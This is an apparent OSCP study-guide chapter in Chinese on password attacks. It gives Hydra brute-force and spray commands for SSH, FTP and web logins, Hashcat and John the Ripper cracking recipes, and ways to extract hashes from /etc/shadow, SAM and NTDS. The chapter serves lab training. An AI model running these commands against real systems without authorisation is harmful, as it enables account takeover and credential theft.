# Ch 18 — 密碼攻擊：Hydra / Hashcat / John the Ripper

> 目標：能對 SSH/FTP/Web 服務做暴力破解，能識別和破解常見的密碼 hash。

## 密碼攻擊的兩個場景

**場景一：線上暴力破解**
- 目標：一個服務的登入介面（SSH, FTP, Web）
- 工具：Hydra
- 限制：速度慢，可能觸發帳號鎖定，OSCP 考試謹慎使用

**場景二：離線 Hash 破解**
- 目標：你從靶機提取的密碼 hash（/etc/shadow, SAM, NTLM）
- 工具：Hashcat / John the Ripper
- 限制：GPU 越強越快，CPU 也能跑但慢

## Hydra：線上暴力破解

### SSH 暴力破解

```bash
# 單個帳號
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.x

# 多個帳號（users.txt）
hydra -L users.txt -P passwords.txt ssh://10.10.10.x

# 指定 port
hydra -l admin -P wordlist.txt ssh://10.10.10.x -s 2222

# 減少並發（避免太快被擋）
hydra -l admin -P wordlist.txt ssh://10.10.10.x -t 4
```

### FTP 暴力破解

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.x
```

### HTTP 表單暴力破解

```bash
# HTTP POST（最常用）
hydra -l admin -P rockyou.txt http-post-form://10.10.10.x/login.php:'username=^USER^&password=^PASS^':'Invalid password'

# 最後一個字串是「失敗」的標誌（找登入失敗時的回應文字）
# 如果成功反而是要排除的，用 !success 的格式：
hydra -l admin -P rockyou.txt http-post-form://target/login:'u=^USER^&p=^PASS^':'F=Invalid'

# HTTPS
hydra -l admin -P rockyou.txt https-post-form://10.10.10.x/login.php:'u=^USER^&p=^PASS^':'Invalid'
```

### 常用 Wordlist

```bash
/usr/share/wordlists/rockyou.txt           # 14M 密碼，最常用
/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt  # 快速試
/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt                 # 較小版
```

## 識別 Hash 類型

在破解前要知道 hash 的類型：

```bash
# 用 hash-identifier
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"
# 輸出：Most likely MD5

# 用 hashid
hashid "5f4dcc3b5aa765d61d8327deb882cf99"

# hashcat 的 hash 模式（-m）
```

### 常見 Hash 格式

```
MD5：          32 hex chars    (5f4dcc3b5aa765d61d8327deb882cf99)
SHA1：         40 hex chars    (5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8)
SHA256：       64 hex chars
bcrypt：       $2a$, $2b$      ($2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy)
MD5 crypt：    $1$             ($1$abc$...)
SHA512 crypt： $6$             ($6$abc$...)（Linux shadow 常用）
NTLM：         32 hex chars，但和 MD5 不同（格式上看不出來，靠 context 判斷）
Net-NTLMv2：   username::domain:...:...（Responder 抓到的格式）
```

## Hashcat

GPU 破解最快，但 CPU 也能跑（只是慢）。

```bash
# 基本語法
hashcat -m <mode> <hashfile> <wordlist>

# -m = hash 類型
# 0    = MD5
# 100  = SHA1
# 1000 = NTLM
# 1800 = SHA512crypt (Linux shadow $6$)
# 500  = md5crypt (Linux shadow $1$)
# 3200 = bcrypt
# 5600 = Net-NTLMv2

# 範例：破解 MD5
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# 範例：破解 Linux shadow hash（$6$）
hashcat -m 1800 shadow_hash.txt /usr/share/wordlists/rockyou.txt

# 範例：破解 NTLM
hashcat -m 1000 ntlm_hash.txt /usr/share/wordlists/rockyou.txt

# 規則攻擊（比純字典更多變化）
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 查看已破解的結果
hashcat -m 0 hash.txt --show
```

## John the Ripper

CPU 友好，適合沒有 GPU 的環境：

```bash
# 基本語法
john hashfile.txt --wordlist=/usr/share/wordlists/rockyou.txt

# 指定 hash 格式（John 通常能自動偵測）
john hashfile.txt --format=md5crypt --wordlist=rockyou.txt
john hashfile.txt --format=NT --wordlist=rockyou.txt      # NTLM
john hashfile.txt --format=sha512crypt --wordlist=rockyou.txt

# 顯示破解結果
john hashfile.txt --show

# 破解 /etc/shadow（要先合併 passwd 和 shadow）
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt
```

### 專用轉換工具

John 有 `*2john` 系列工具，把各種格式轉成 John 可以讀的 hash：

```bash
ssh2john id_rsa > id_rsa.hash          # SSH 私鑰（有密碼保護的）
zip2john protected.zip > zip.hash      # 加密 ZIP
rar2john protected.rar > rar.hash      # 加密 RAR
keepass2john database.kdbx > kp.hash  # KeePass 資料庫
office2john document.docx > doc.hash  # 加密 Office 文件

# 然後
john id_rsa.hash --wordlist=rockyou.txt
```

## 提取 Hash 的方法

### Linux /etc/shadow

```bash
# 有 root 或 shadow 群組才能讀
cat /etc/shadow

# 格式：username:$algorithm$salt$hash:...
root:$6$abc123$veryLongHashString...:18000:0:99999:7:::
```

### Windows SAM / NTDS.dit（考試後期）

```bash
# Meterpreter 下
meterpreter > hashdump

# 或用 impacket（Ch 34 AD 章節）
secretsdump.py administrator@10.10.10.x
```

## 密碼噴灑（Password Spray）

**跟暴力破解相反的策略**：一個密碼對很多帳號試，避免單帳號鎖定：

```bash
# 用 Hydra
hydra -L users.txt -p 'Password123' ssh://10.10.10.x

# 常用的 spray 密碼：
# Password1, Password123, Welcome1, Summer2023, P@ssw0rd
# CompanyName + 年份：Acme2023
```

## 本章對應靶機

| 機器 | 密碼攻擊場景 |
|------|------------|
| HTB Valentine | 讀取加密的 RSA key → john 破解 passphrase |
| HTB Lame | FTP 匿名，SSH 用找到的密碼 |
| HTB Mirai | 預設憑證（Pi-hole default） |

## 自我檢核

- [ ] 能用 Hydra 對 SSH 和 HTTP POST 表單做暴力破解
- [ ] 能識別 MD5, SHA512crypt ($6$), NTLM 的 hash 格式
- [ ] 能用 Hashcat 破解 MD5 和 NTLM hash
- [ ] 能用 John 破解有密碼保護的 SSH 私鑰

→ [Ch 19 反彈 Shell 技巧全集：各語言、各協定](./19-reverse-shells.md)
